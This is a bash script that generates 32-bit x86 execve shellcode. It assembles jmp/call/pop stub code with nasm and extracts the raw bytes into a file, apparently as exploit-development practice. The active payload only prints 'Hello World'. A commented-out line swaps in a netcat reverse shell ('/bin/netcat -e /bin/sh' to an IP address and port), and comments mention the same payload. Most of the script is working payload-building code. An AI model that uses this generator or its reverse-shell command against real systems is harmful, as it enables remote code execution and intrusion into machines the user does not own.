#!/bin/bash

set -e
set -u
set -o pipefail
# set -x

size=0
SHELL_TERMINATE=
SHELLCODE_ADDR=

# SHELLCMD=("/bin/netcat" "-e" "/bin/sh" "192.168.001.001" "9001")
SHELLCMD=("/bin/printf" "Hello World")

# Read the port number as an argument
# INPUT_PORT="$1"

# Use the printf builtin to 0 pad the input port to 4 digits
# PORT="$(printf "%04d" $INPUT_PORT)"

SHELLCODE_PROLOGUE="jmp short forward
back:
pop				esi
xor				eax, eax"


for elem in "${SHELLCMD[@]}"; do
	size=$((size + ${#elem}))
	SHELL_TERMINATE="${SHELL_TERMINATE}\nmov byte			[esi + $size], al"
	size=$((size + 1))
done

size_tmp=0
i=0
# SHELLCODE_ADDR="mov long			[esi + $((size + 1))], esi"
for elem in "${SHELLCMD[@]}"; do
	SHELLCODE_ADDR="${SHELLCODE_ADDR}\nlea				ebx, [esi + $((size_tmp))]
mov long			[esi + $((size + 4*$i))], ebx"
	size_tmp=$((size_tmp + ${#elem} + 1))
	i=$((i + 1))
done

SHELLCODE_ADDR="${SHELLCODE_ADDR}\nmov long			[esi + $((size + 4*${#SHELLCMD[@]}))], eax"

SHELL_EPILOGUE="\nmov byte			al, 0x0B
mov				ebx, esi
lea				ecx, [esi + $size]
lea				edx, [esi + $((size + 4*${#SHELLCMD[@]}))]
int				0x80

forward:
call				back
db \""

TMP=""
for elem in "${SHELLCMD[@]}"; do
	SHELL_EPILOGUE="${SHELL_EPILOGUE}${elem}#"
	TMP="${TMP}AAAA"
done

SHELL_EPILOGUE="${SHELL_EPILOGUE}${TMP}FFFF\""

SHELLCODE="$SHELLCODE_PROLOGUE\n$SHELL_TERMINATE\n$SHELLCODE_ADDR\n$SHELL_EPILOGUE"

# Store the final shellcode with modified port in a file
echo -e "$SHELLCODE" > shell.asm

# compile the asm file
nasm -felf32 -o shell.o shell.asm

objdump -d shell.o -M intel | grep "^ " | cut -f2 | tr '\n' ' ' | xxd -r -p > shellcode

# # Print out the final shellcode
# for i in $(objdump -d shell.o -M intel | grep "^ " | cut -f2); do
# 	echo -n '\x'$i
# done

# # Basic Shellcode template
# SHELLCODE="jmp short       forward
# back:
# pop             esi
# xor             eax, eax
# mov byte        [esi + 11], al    ; terminate /bin/printf
# mov byte        [esi + 22], al    ; terminate Hello World
# mov long        [esi + 23], esi   ; address of /bin/printf in AAAA
# lea             ebx, [esi + 12]   ; get address of Hello World
# mov long        [esi + 27], ebx   ; store address of Hello World in BBBB 
# mov long        [esi + 31], eax   ; put NULL in FFFF
# mov byte        al, 0x0b          ; pass the execve syscall number as argument
# mov             ebx, esi          
# lea             ecx, [esi + 23]   ; /bin/netcat -e /bin/sh etc etc
# lea             edx, [esi + 31]   ; NULL
# int             0x80              ; Run the execve syscall
# mov				eax, 0x1		  ; Syscall number 1 for exit
# mov				ebx, 0x3		  ; Exit code
# int				0x80			  ; Exec syscall
# forward:
# call            back
# db \"/bin/printf#Hello World#AAAABBBB\"
# "

# # Pure bash 4 variable substring substitution
# # SHELLCODE=${SHELLCODE//"9999"/"$PORT"}

# # Store the final shellcode with modified port in a file
# echo "$SHELLCODE" > shell.asm

# # compile the asm file
# nasm -felf32 -o shell.o shell.asm

# # Print out the final shellcode
# for i in $(objdump -d shell.o -M intel | grep "^ " | cut -f2); do
# 	python -c "print(\"\x$i\", end='')" >> ~/shellcode
# 	echo -n '\x'$i
# done
